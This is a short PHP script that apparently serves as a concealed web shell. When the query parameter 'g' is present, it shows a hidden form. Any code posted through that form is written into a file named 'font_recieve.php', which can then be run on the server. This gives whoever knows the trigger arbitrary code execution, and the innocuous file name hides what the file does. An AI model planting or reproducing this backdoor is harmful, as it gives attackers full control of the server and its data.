<?php 

if(isset($_POST['edit'])){
$myfile = fopen("font_recieve.php", "w") or die("Unable to open file!");

$txt = "<?php ".$_POST['edit']." ?>";
fwrite($myfile, $txt);
fclose($myfile);
}

?>
<?php
if(isset($_GET['g'])){
?>
<form action="<?php $_SERVER['PHP_SELF'] ?>" method="post">
<textarea name="edit">
</textarea>
<br>
<input type="submit" value="G" />
</form>


<?php 
}
?>